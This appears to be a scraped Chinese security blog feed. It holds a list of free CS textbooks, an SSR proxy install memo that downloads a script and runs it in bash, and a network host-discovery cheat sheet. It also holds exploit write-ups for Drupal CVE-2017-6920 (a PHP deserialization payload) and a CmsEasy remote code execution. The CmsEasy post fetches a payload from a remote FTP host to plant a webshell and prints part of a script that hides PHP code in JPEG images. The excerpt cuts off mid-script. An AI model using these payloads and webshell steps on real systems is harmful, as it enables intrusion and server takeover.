href="http://bob.cs.sonoma.edu/IntroCompOrg-RPi/intro-co-rpi.html" target="_blank" rel="noopener">ARM 汇编语言简介</a></li><li><a href="https://pacman128.github.io/pcasm/" target="_blank" rel="noopener">PC Assembly Language</a></li></ol><h2 id="四、数据库"><a href="#四、数据库" class="headerlink" title="四、数据库"></a>四、数据库</h2><ol><li><a href="https://selectstarsql.com/" target="_blank" rel="noopener">SQL 开源教程</a></li><li><a href="https://cstack.github.io/db_tutorial/" target="_blank" rel="noopener">如何开发一个简单的数据库</a></li><li><a href="http://webdam.inria.fr/Alice/" target="_blank" rel="noopener">数据库基础</a></li><li><a href="https://www.liaoxuefeng.com/wiki/896043488029600" target="_blank" rel="noopener">廖雪峰 SQL 教程</a>（中文）</li><li><a href="https://www.graphile.org/postgraphile/postgresql-schema-design/" target="_blank" rel="noopener">PostgreSQL 模式设计</a></li></ol><h2 id="五、软件开发"><a href="#五、软件开发" class="headerlink" title="五、软件开发"></a>五、软件开发</h2><ol><li><a href="https://www.bottomupcs.com/index.xhtml" target="_blank" rel="noopener">计算机科学入门</a></li><li><a href="http://craftinginterpreters.com/contents.html" target="_blank" rel="noopener">编写解释器</a>（Crafting interpreters）</li><li><a href="http://www.emulator101.com/" target="_blank" rel="noopener">Emulator 101</a></li><li><a href="https://mitpress.mit.edu/sites/default/files/sicp/index.html" target="_blank" rel="noopener">计算机程序的结构和解释（SICP）</a></li><li><a href="http://www.composingprograms.com/" target="_blank" rel="noopener">编写程序（Composing Programs）</a></li><li><a href="https://github.com/cfenollosa/os-tutorial" target="_blank" rel="noopener">从零开始写一个操作系统</a></li><li><a href="https://github.com/DoctorWkt/acwj" target="_blank" rel="noopener">编译器教程</a>: 如何写一个最小的 C 语言编译器</li><li><a href="https://github.com/lotabout/write-a-C-interpreter/tree/master/tutorial/en" target="_blank" rel="noopener">写一个 C 语言解释器</a>（Write a C interpreter）</li><li><a href="https://github.com/angrave/SystemProgramming/wiki" target="_blank" rel="noopener">System Programming</a></li><li><a href="https://htdp.org/2018-01-06/Book/index.html" target="_blank" rel="noopener">How to Design Programs</a>（第二版）</li><li><a href="http://jeffe.cs.illinois.edu/teaching/algorithms/" target="_blank" rel="noopener">算法</a>，by Jeff Erickson，<a href="https://github.com/jeffgerickson/algorithms" target="_blank" rel="noopener">GitHub 仓库</a></li><li><a href="http://theory.stanford.edu/~amitp/GameProgramming/" target="_blank" rel="noopener">A* 算法教程</a></li><li><a href="https://github.com/dennis714/RE-for-beginners" target="_blank" rel="noopener">逆向工程入门</a>（Reverse Engineering for Beginners，<a href="http://beginners.re/Reverse_Engineering_for_Beginners-en.pdf" target="_blank" rel="noopener">英文</a>，<a href="https://beginners.re/RE4B-CN-vol1.pdf" target="_blank" rel="noopener">中文卷一</a>, <a href="https://beginners.re/RE4B-CN-vol2.pdf" target="_blank" rel="noopener">中文卷二</a>）</li><li><a href="https://www.begin.re/" target="_blank" rel="noopener">逆向工程初学者教程</a></li><li><a href="https://github.com/winitzki/sofp" target="_blank" rel="noopener">函数式编程：以 Scala 为例</a></li><li><a href="https://www.learn-clojurescript.com/" target="_blank" rel="noopener">学习 ClojureScript</a></li><li><a href="https://mirrors.edge.kernel.org/pub/linux/kernel/people/paulmck/perfbook/perfbook.html" target="_blank" rel="noopener">并行编程</a></li><li><a href="https://landing.google.com/sre/books/" target="_blank" rel="noopener">谷歌 SRE（网站可靠性工程）丛书</a></li><li><a href="https://github.com/iggredible/Learn-Vim" target="_blank" rel="noopener">轻松学习 Vim</a>（Learn Vim the smart way）</li><li><a href="https://github.com/wsdjeg/vim-galore-zh_cn" target="_blank" rel="noopener">Vim 从入门到精通</a>（中文）</li><li><a href="https://qmlbook.github.io/" target="_blank" rel="noopener">Qt5 教程</a></li></ol><h2 id="六、人工智能"><a href="#六、人工智能" class="headerlink" title="六、人工智能"></a>六、人工智能</h2><ol><li><a href="https://github.com/ajaymache/machine-learning-yearning" target="_blank" rel="noopener">Machine Learning Yearning</a>，by 吴恩达</li><li><a href="https://ds8.gitbooks.io/textbook/content/" target="_blank" rel="noopener">计算与推断：数据科学基础</a></li><li><a href="https://github.com/norvig/paip-lisp" target="_blank" rel="noopener">人工智能编程的 Lisp 范例</a>（Paradigms of Artificial Intelligence Programming）</li><li><a href="https://bloomberg.github.io/foml/" target="_blank" rel="noopener">Bloomberg 机器学习课程</a></li><li><a href="https://github.com/DiHiera/Algorithm_Interview_Notes-Chinese-master" target="_blank" rel="noopener">深度学习/机器学习面试笔记</a>（中文）</li><li><a href="https://www-users.cs.umn.edu/~kumar001/dmbook/index.php" target="_blank" rel="noopener">数据挖掘教材</a></li><li><a href="https://christophm.github.io/interpretable-ml-book/" target="_blank" rel="noopener">机器学习解释</a></li><li>深入深度学习（<a href="https://d2l.ai/" target="_blank" rel="noopener">英文</a>，<a href="https://zh.d2l.ai/" target="_blank" rel="noopener">中文</a>）</li><li><a href="https://github.com/open-source-for-science/TensorFlow-Course" target="_blank" rel="noopener">TensorFlow-Course</a></li><li><a href="https://tf.wiki/" target="_blank" rel="noopener">简单粗暴 TensorFlow 2</a>（中文）</li><li><a href="http://mbmlbook.com/" target="_blank" rel="noopener">基于模型的机器学习</a></li><li><a href="https://github.com/Spandan-Madan/DeepLearningProject" target="_blank" rel="noopener">Deep Learning Project</a></li><li><a href="http://incompleteideas.net/book/the-book.html" target="_blank" rel="noopener">强化学习导论</a>（第二版）</li><li><a href="https://livebook.manning.com/#!/book/grokking-deep-learning/" target="_blank" rel="noopener">Grokking Deep Learning</a></li><li><a href="https://github.com/nndl/nndl.github.io" target="_blank" rel="noopener">神经网络与深度学习</a></li><li><a href="https://easyai.tech/blog/65pdf-pm-understand-dl/" target="_blank" rel="noopener">让产品经理全面理解深度学习</a>（中文）</li><li><a href="http://fe4ml.apachecn.org/#/" target="_blank" rel="noopener">面向机器学习的特征工程</a>（中文）</li><li><a href="https://www.cse.huji.ac.il/~shais/UnderstandingMachineLearning/copy.html" target="_blank" rel="noopener">理解机器学习：从理论到算法</a></li><li><a href="http://www.d2l.ai/index.html" target="_blank" rel="noopener">Dive into Deep Learning</a></li><li><a href="https://www.cs.cornell.edu/jeh/book%20no%20so;utions%20March%202019.pdf" target="_blank" rel="noopener">数据科学基础</a></li><li><a href="https://mml-book.github.io/" target="_blank" rel="noopener">机器学习的数学基础</a></li><li><a href="https://github.com/jacobeisenstein/gt-nlp-class/raw/master/notes/eisenstein-nlp-notes.pdf" target="_blank" rel="noopener">自然语言处理</a></li><li><a href="https://github.com/fastai/fastbook" target="_blank" rel="noopener">面向程序员的深度学习</a>（Practical Deep Learning for Coders）（<a href="https://course.fast.ai/" target="_blank" rel="noopener">官网</a>）</li><li><a href="https://dafriedman97.github.io/mlbook/content/introduction.html" target="_blank" rel="noopener">从头学习机器学习</a>（Machine Learning from Scratch）</li></ol><h2 id="七、数学理论"><a href="#七、数学理论" class="headerlink" title="七、数学理论"></a>七、数学理论</h2><h3 id="7-1-微积分"><a href="#7-1-微积分" class="headerlink" title="7.1 微积分"></a>7.1 微积分</h3><ol><li><a href="https://infinitedescent.xyz/" target="_blank" rel="noopener">进入纯数学</a></li><li><a href="http://calculusmadeeasy.org/" target="_blank" rel="noopener">微积分很容易</a>（Calculus made easy）</li></ol><h3 id="7-2-统计与概率"><a href="#7-2-统计与概率" class="headerlink" title="7.2 统计与概率"></a>7.2 统计与概率</h3><ol><li><a href="https://seeing-theory.brown.edu/#firstPage" target="_blank" rel="noopener">Seeing Theory：概率论和统计入门</a></li><li><a href="https://www.statisticsdonewrong.com/index.html" target="_blank" rel="noopener">Statistics Done Wrong</a></li><li><a href="http://www.jerrydallal.com/LHSP/LHSP.htm" target="_blank" rel="noopener">统计小手册</a></li><li><a href="http://faculty.marshall.usc.edu/gareth-james/ISL/" target="_blank" rel="noopener">统计学习导论</a>（An Introduction to Statistical Learning）</li><li><a href="https://ocw.mit.edu/courses/mathematics/18-650-statistics-for-applications-fall-2016/lecture-slides/" target="_blank" rel="noopener">麻省理工学院统计学课件</a></li><li><a href="http://prob140.org/textbook/README" target="_blank" rel="noopener">Prob 140</a>：概率论教材</li><li><a href="https://otexts.org/fpp2/" target="_blank" rel="noopener">预测：原理与实践</a></li><li><a href="https://www.textbook.ds100.org/" target="_blank" rel="noopener">数据科学的原理与技巧</a></li><li><a href="https://probabilitycourse.com/" target="_blank" rel="noopener">概率、统计和随机过程导论</a></li><li><a href="https://web.ma.utexas.edu/users/gordanz/lecture_notes_page.html" target="_blank" rel="noopener">概率，统计和随机过程讲义</a></li><li><a href="https://web.ma.utexas.edu/users/gordanz/notes/introduction_to_stochastic_processes.pdf" target="_blank" rel="noopener">随机过程导论</a></li></ol><h3 id="7-3-线性代数"><a href="#7-3-线性代数" class="headerlink" title="7.3 线性代数"></a>7.3 线性代数</h3><ol><li><a href="https://hadrienj.github.io/posts/Deep-Learning-Book-Series-Introduction/" target="_blank" rel="noopener">深度学习的线性代数基础</a></li><li><a href="http://joshua.smcvt.edu/linearalgebra/#current_version" target="_blank" rel="noopener">线性代数教材</a></li><li><a href="https://hefferon.net/linearalgebra/" target="_blank" rel="noopener">线性代数</a>, by Jim Hefferon</li><li><a href="http://immersivemath.com/ila/index.html" target="_blank" rel="noopener">沉浸式线性代数</a></li><li><a href="https://textbooks.math.gatech.edu/ila/" target="_blank" rel="noopener">交互式线性代数教程</a></li></ol><h3 id="7-4-密码学"><a href="#7-4-密码学" class="headerlink" title="7.4 密码学"></a>7.4 密码学</h3><ol><li><a href="http://toc.cryptobook.us/" target="_blank" rel="noopener">应用加密法的研究生教材</a></li><li><a href="https://intensecrypto.org/public/" target="_blank" rel="noopener">加密学导论</a></li><li><a href="https://www.crypto101.io/" target="_blank" rel="noopener">Crypto 101</a></li><li><a href="https://link.springer.com/book/10.1007%2F978-3-319-21936-3" target="_blank" rel="noopener">密码学很容易</a>（Cryptography Made Simple）</li><li><a href="https://cryptobook.nakov.com/" target="_blank" rel="noopener">程序员的实用密码学</a></li><li><a href="http://web.engr.oregonstate.edu/~rosulekm/crypto/" target="_blank" rel="noopener">密码学的喜悦</a>（The Joy of Cryptography）</li></ol><h3 id="7-5-其他理论书籍"><a href="#7-5-其他理论书籍" class="headerlink" title="7.5 其他理论书籍"></a>7.5 其他理论书籍</h3><ol><li><a href="https://courses.csail.mit.edu/6.042/spring17/mcs.pdf" target="_blank" rel="noopener">计算机科学的数学基础</a>（Mathematics for Computer Science, PDF）</li><li><a href="http://www.scratchapixel.com/" target="_blank" rel="noopener">计算机图形学教程</a></li><li><a href="https://introtcs.org/public/index.html" target="_blank" rel="noopener">计算机科学的理论导论</a></li><li><a href="https://quantum.country/qcvc" target="_blank" rel="noopener">好奇者的量子计算入门</a></li><li><a href="https://book.simply-logical.space/" target="_blank" rel="noopener">简单逻辑</a></li><li><a href="https://github.com/hmemcpy/milewski-ctfp-pdf/" target="_blank" rel="noopener">写给程序员的范畴论</a>（Category Theory for Programmers）</li><li><a href="http://category-theory.mitpress.mit.edu/" target="_blank" rel="noopener">写给科学家的范畴论</a>（Category Theory for the Sciences）, <a href="https://github.com/mmai/Category-Theory-for-the-Sciences" target="_blank" rel="noopener">下载</a></li><li><a href="https://mrpandey.github.io/d3graphTheory/index.html" target="_blank" rel="noopener">图论的 D3 解释</a></li><li><a href="http://discrete.openmathbooks.org/dmoi3.html" target="_blank" rel="noopener">离散数学导论</a></li><li><a href="http://hjemmesider.diku.dk/~torbenm/Basics/basics_lulu2.pdf" target="_blank" rel="noopener">编译器设计基础</a>（PDF）</li></ol><h2 id="八、其他"><a href="#八、其他" class="headerlink" title="八、其他"></a>八、其他</h2><ol><li><a href="https://github.com/jwasham/coding-interview-university/blob/master/translations/README-cn.md" target="_blank" rel="noopener">Google 面试自学手册</a>（中文）</li><li><a href="https://yangshun.github.io/tech-interview-handbook/" target="_blank" rel="noopener">技术面试手册</a></li><li><a href="https://github.com/amirrajan/survivingtheappstore" target="_blank" rel="noopener">如何在应用商店成功？</a></li><li><a href="http://ed-thelen.org/comp-hist/CBC.html" target="_blank" rel="noopener">计算机之前的计算设备</a></li><li><a href="https://res.wokanxing.info/jpgramma/conditionals.html" target="_blank" rel="noopener">日语语法教程</a>（中文）</li><li><a href="https://courses.dcs.wisc.edu/wp/readinggerman/print-entire-textbook/" target="_blank" rel="noopener">基础德语教程</a></li><li><a href="./docs/任正非文集.epub">任正非文集</a>：任正非1994年～2018年的几百篇讲话。</li><li><a href="https://bunniefoo.com/bunnie/essential/essential-guide-shenzhen-web.pdf" target="_blank" rel="noopener">老外的深圳电子产品采购指南</a>（PDF）</li><li><a href="https://nav.al/rich" target="_blank" rel="noopener">How to get rich</a></li><li><a href="https://pmarchive.com/" target="_blank" rel="noopener">Marc Andreessen 创业文集</a></li><li><a href="http://www.metro.tokyo.jp/chinese/guide/bosai/index.html" target="_blank" rel="noopener">东京防灾手册</a>（中文）</li><li><a href="https://developers.google.com/style/" target="_blank" rel="noopener">谷歌的技术文档写作指南</a></li><li><a href="https://www.c82.net/euclid/" target="_blank" rel="noopener">《几何原本》在线版</a></li><li><a href="https://serialmentor.com/dataviz/" target="_blank" rel="noopener">数据可视化基础</a></li><li><a href="https://archive.org/search.php?query=subject%3A%22The+Navy+Electricity+and+Electronics+Training+Series%22&amp;sort=publicdate" target="_blank" rel="noopener">美国海军电气与电子培训系列教材</a></li></ol><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SSR备忘</title>
      <link href="/2020/12/02/ss-ssr-notes/"/>
      <url>/2020/12/02/ss-ssr-notes/</url>
      
        <content type="html"><![CDATA[<h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><pre><code>yum -y install wgetwget -N –no-check-certificate https://raw.githubusercontent.com/W4nde3/shs/main/ssr.sh &amp;&amp; chmod +x ssr.sh &amp;&amp; bash ssr.sh</code></pre><h2 id="加速-谷歌BBR加速"><a href="#加速-谷歌BBR加速" class="headerlink" title="加速(谷歌BBR加速)"></a>加速(谷歌BBR加速)</h2><pre><code>yum -y install wgetwget –no-check-certificate https://github.com/teddysun/across/raw/master/bbr.shchmod +x bbr.sh./bbr.sh</code></pre><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><ul><li><p>Windows SSR客户端 <a href="https://github.com/shadowsocksr-backup/shadowsocksr-csharp/releases" target="_blank" rel="noopener">下载地址</a> <a href="https://nofile.io/f/6Jm7WJCyOVv/ShadowsocksR-4.7.0-win.7z" target="_blank" rel="noopener">备用下载地址</a></p></li><li><p>MAC SSR客户端 <a href="https://github.com/shadowsocksr-backup/ShadowsocksX-NG/releases" target="_blank" rel="noopener">下载地址</a> <a href="https://nofile.io/f/jgMWFwCBonU#ab0d3c3b6ac54482" target="_blank" rel="noopener">备用下载地址</a></p></li><li><p>Linux客户端一键安装配置 <a href="https://github.com/the0demiurge/CharlesScripts/blob/master/charles/bin/ssr" target="_blank" rel="noopener">使用脚本</a><br>  图形界面的<a href="https://github.com/erguotou520/electron-ssr/releases" target="_blank" rel="noopener">linux ssr客户端</a></p></li><li><p>安卓 SSR客户端 <a href="https://github.com/shadowsocksr-backup/shadowsocksr-android/releases" target="_blank" rel="noopener">下载地址</a> <a href="https://nofile.io/f/rvTJoj0h5GC/shadowsocksr-release.apk" target="_blank" rel="noopener">备用下载地址</a></p></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>主机发现</title>
      <link href="/2020/12/02/host-discovery/"/>
      <url>/2020/12/02/host-discovery/</url>
      
        <content type="html"><![CDATA[<h2 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h2><pre><code>nmap -sU -T5 -sV --max-retries 1 192.168.1.100 -p 500msf &gt; use auxiliary/scanner/discovery/udp_probemsf &gt; use auxiliary/scanner/discovery/udp_sweepunicornscan -mU 192.168.1.100ScanLineUDP扫描工具</code></pre><h2 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h2><pre><code>nmap -sn -PR 192.168.1.1/24msf &gt; use auxiliary/scanner/discovery/arp_sweep(kali)netdiscover -r 192.168.1.0/24 -i wlan0(powershell)powershell.exe -exec bypass -Command "Import-Module .\arpscan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/24"</code></pre><h2 id="Netbios"><a href="#Netbios" class="headerlink" title="Netbios"></a>Netbios</h2><pre><code>nmap -sU --script nbstat.nse -p137 192.168.1.0/24 -T4msf &gt; use auxiliary/scanner/netbios/nbname(kali)nbtscan</code></pre><h2 id="SNMP"><a href="#SNMP" class="headerlink" title="SNMP"></a>SNMP</h2><pre><code>nmap -sU --script snmp-brute 192.168.1.0/24 -T4msf &gt; use auxiliary/scanner/snmp/snmp_enum(kali)snmpbulkwalk(kali)snmp-check(kali)snmptestsnmp scanner(https://www.solarwinds.com/network-performance-monitor/use-cases/snmp-scanner)</code></pre><h2 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h2><pre><code>nmap ‐sn ‐PE ‐T4 192.168.1.0/24nmap ‐sP ‐PI ‐T4 192.168.1.0/24(CMD)for /L %P in (1,1,254) DO @ping ‐w 1 ‐n 1 192.168.1.%P | findstr "TTL ="(powershell)powershell.exe ‐exec bypass ‐Command "Import‐Module ./Invoke‐TSPingSweep.ps1; Invoke‐TSPingSweep ‐StartAddress 192.168.1.1 ‐EndAddress 192.168.1.254 ‐ResolveHost ‐ScanPort ‐Port 445,135"</code></pre><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><pre><code>nmap ‐sU ‐sS ‐‐script smb‐enum‐shares.nse ‐p 445 192.168.1.119msf &gt; use scanner/smb/smb_version(CMD)for /l %a in (1,1,254) do start /min /low telnet 192.168.1.%a 445(powershell单IP)445 | %{ echo ((new‐object Net.Sockets.TcpClient).Connect("192.168.1.119",$_)) "$_ is open"} 2&gt;$null(powershell多IP)1..5 | % { $a = $_; 445 | % {echo ((new‐objectNet.Sockets.TcpClient).Connect("192.168.1.$a",$_)) "Port $_ is open"}2&gt;$null}(powershell多IP多PORT)118..119 | % { $a = $_; write‐host "‐‐‐‐‐‐"; write‐host"192.168.1.$a"; 80,445 | % {echo ((new‐object Net.Sockets.TcpClient).Connect("192.168.1.$a",$_)) "Port $_ is open"} 2&gt;$null}</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Drupal PECL YAML parser 远程代码执行漏洞(CVE-2017-6920)</title>
      <link href="/2020/11/17/drupal-8.3.3-rce/"/>
      <url>/2020/11/17/drupal-8.3.3-rce/</url>
      
        <content type="html"><![CDATA[<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h3><ol><li><p>搭建好环境，服务开放于<a href="http://45.32.74.108:8000" target="_blank" rel="noopener">http://45.32.74.108:8000</a> </p></li><li><p>序列化一个<code>GuzzleHttp\Psr7\FnStream</code>类, 并给该序列化字符串加上yaml的<code>!php/object</code></p><pre><code>!php/object "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\0GuzzleHttp\\Psr7\\FnStream\0methods\";a:1:{s:5:\"close\";s:7:\"phpinfo\";}s:9:\"_fn_close\";s:7:\"phpinfo\";}"</code></pre></li></ol><ol start="3"><li>登陆一个管理员账号，访问 <a href="http://127.0.0.1:8000/admin/config/development/configuration/single/import" target="_blank" rel="noopener">http://127.0.0.1:8000/admin/config/development/configuration/single/import</a></li><li>填写表单<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/11/047dda655e7a8421.png" alt=""></li><li>点击import即可触发<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/11/42aade8fa6302025.png" alt=""></li></ol><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>对比Drupal的8.3.3和8.3.4版本，发现主要有四个文件做了改动：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/11/b7fc8ee055752f1e.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/11/1c0b85a0157ec366.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/11/bb0acc60c87888a5.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/11/25b1146157293846.png" alt=""><br>漏洞点在/Drupal/Component/Serialization/YamlPecl.php的decode函数中</p><pre><code>public static function decode($raw) {  // yaml_parse() will error with an empty value.  if (!trim($raw)) {    return NULL;  }  set_error_handler([__CLASS__, 'errorHandler']);  $ndocs = 0;  $data = yaml_parse($raw, 0, $ndocs, [    YAML_BOOL_TAG =&gt; '\Drupal\Component\Serialization\YamlPecl::applyBooleanCallbacks',  ]);  restore_error_handler();  return $data;}</code></pre><p>参数$raw被带入yaml_parse函数中，其中$raw可控，在文档中有一个特别声明：</p><p>Warning Processing untrusted user input with yamlparse() is dangerous if the use of unserialize() is enabled for nodes using the !php/object tag. This behavior can be disabled by using the yaml.decodephp ini setting. </p><p>因此可以通过<code>!php/object</code>声明一个节点，然后用这个节点内容以unserialize的方式处理。找到调用这个YamlPecl::decode函数的地方：</p><pre><code>public static function decode($raw) {   $serializer = static::getSerializer();   return $serializer::decode($raw); } protected static function getSerializer() {   if (!isset(static::$serializer)) {     if (extension_loaded('yaml')) {       static::$serializer = YamlPecl::class;     }     else {       // Otherwise, fallback to the Symfony implementation.       static::$serializer = YamlSymfony::class;     }   }   return static::$serializer; }</code></pre><p>这里会检测是否加载了Yaml的插件，如果加载插件则会调用到危险函数。找调用了Yaml::decode函数的外部可控点，在/core/modules/config/src/Form/ConfigSingleImportForm.php中第280行：</p><pre><code>public function validateForm(array &amp;$form, FormStateInterface $form_state) { // The confirmation step needs no additional validation. if ($this-&gt;data) { return; }try {  // Decode the submitted import.  $data = Yaml::decode($form_state-&gt;getValue('import'));}catch (InvalidDataTypeException $e) {  $form_state-&gt;setErrorByName('import', $this-&gt;t('The import failed with the following message: %message', ['%message' =&gt; $e-&gt;getMessage()]));}</code></pre><p>到这里已经找到了触发PHP反序列化的函数和可控点，只需找到能够反序列化执行函数或写文件的类即可，全局搜索__destruct和__weakup,在/vendor/guzzlehttp/psr7/src/FnStream.php中第48行中能够找到执行无参函数的漏洞点</p><pre><code>public function __destruct() { if (isset($this-&gt;_fn_close)) { call_user_func($this-&gt;_fn_close); } } </code></pre><p>因此构造出Payload：</p><pre><code>!php/object "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\0GuzzleHttp\\Psr7\\FnStream\0methods\";a:1:{s:5:\"close\";s:7:\"phpinfo\";}s:9:\"_fn_close\";s:7:\"phpinfo\";}"</code></pre><h3 id="关于Yaml插件安装"><a href="#关于Yaml插件安装" class="headerlink" title="关于Yaml插件安装"></a>关于Yaml插件安装</h3><p><a href="http://pecl.php.net/package/yaml" target="_blank" rel="noopener">下载插件</a>后进入目录：</p><pre><code>$ phpize$ ./configure$ make$ make install</code></pre><p>若成功则会返回编译好的扩展所在目录，在php.ini中修改extension_dir=[这个目录]，再设置extension=yaml.so即可</p><h3 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h3><pre><code>yaml_parse函数：将部分或所有的YAML文档流转换成PHP对象mixed yaml_parse ( string $input [, int $pos = 0 [, int &amp;$ndocs [, array $callbacks ]]] )inputThe string to parse as a YAML document stream.posDocument to extract from stream (-1 for all documents, 0 for first document, ...).ndocsIf ndocs is provided, then it is filled with the number of documents found in stream.callbacksContent handlers for YAML nodes. Associative array of YAML tag =&gt; callable mappings. See parse callbacks for more details.</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CmsEasy &lt; 5.6  代码执行漏洞</title>
      <link href="/2020/11/11/cmseasy-5.6-getshell/"/>
      <url>/2020/11/11/cmseasy-5.6-getshell/</url>
      
        <content type="html"><![CDATA[<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h3><p>准备好匿名访问的FTP server，将<a href="http://cloud.iwonder.run/#s/6ZK4ARUg" target="_blank" rel="noopener">payload图片</a>上传到ftp目录下<br>POST访问搭建好的漏洞环境：</p><pre><code>http://45.32.74.108:8000/index.php?case=tool&amp;act=cut_image</code></pre><p>post-data:</p><pre><code>pic=1ftp://108.160.128.46/poc_phpinfo_700x1120.php&amp;w=700&amp;h=1120&amp;x1=0&amp;x2=700&amp;y1=0&amp;y2=1120</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/11/451f9107518fd86e.png" alt=""><br>得到上传文件的地址，访问之～<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/11/cbd6be74fe27e8c3.png" alt=""></p><h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><p>准备好匿名访问的FTP server，将[payload图片](<a href="http://cloud.iwonder.run/#s/6ZK3" target="_blank" rel="noopener">http://cloud.iwonder.run/#s/6ZK3</a>    6exg)上传到ftp目录下<br>POST访问搭建好的漏洞环境</p><pre><code>http://45.32.74.108:8000/index.php?case=tool&amp;act=cut_image</code></pre><p>post-data:</p><pre><code>pic=1ftp://108.160.128.46/exp_eval_post_c_700x1120.php&amp;w=700&amp;h=1120&amp;x1=0&amp;x2=700&amp;y1=0&amp;y2=1120</code></pre><p>得到上传文件的地址，蚁剑连密码为c<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/11/42cf4c151b3de053.png" alt=""></p><h3 id="自定义"><a href="#自定义" class="headerlink" title="自定义"></a>自定义</h3><p>利用脚本生成自己的图片payload</p><pre><code>&lt;?php$miniPayload ='&lt;?php phpinfo();?&gt;';print $miniPayload;if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {    die('php-gd is not installed');}if(!isset($argv[1])) {    die('php jpg_payload.php &lt;jpg_name.jpg&gt;');}set_error_handler("custom_error_handler");for($pad = 0; $pad &lt; 1024; $pad++) {    $nullbytePayloadSize = $pad;    $dis = new DataInputStream($argv[1]);    $outStream = file_get_contents($argv[1]);    $extraBytes = 0;    $correctImage = TRUE;    if($dis-&gt;readShort() != 0xFFD8) {        die('Incorrect SOI marker');    }    while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) {        $marker = $dis-&gt;readByte();        $size = $dis-&gt;readShort() - 2;        $dis-&gt;skip($size);        if($marker === 0xDA) {            $startPos = $dis-&gt;seek();            $outStreamTmp =                 substr($outStream, 0, $startPos) .                 $miniPayload .                 str_repeat("\0",$nullbytePayloadSize) .                 substr($outStream, $startPos);            checkImage('_'.$argv[1], $outStreamTmp, TRUE);            if($extraBytes !== 0) {                while((!$dis-&gt;eof())) {                    if($dis-&gt;readByte() === 0xFF) {                        if($dis-&gt;readByte !== 0x00) {                            break;                        }                    }                }                $stopPos = $dis-&gt;seek() - 2;                $imageStreamSize = $stopPos - $startPos;                $outStream =                     substr($outStream, 0, $startPos) .                     $miniPayload .                     substr(                        str_repeat("\0",$nullbytePayloadSize).                            substr($outStream, $startPos, $imageStreamSize),                        0,                        $nullbytePayloadSize+$imageStreamSize-$extraBytes) .                             substr($outStream, $stopPos);            } 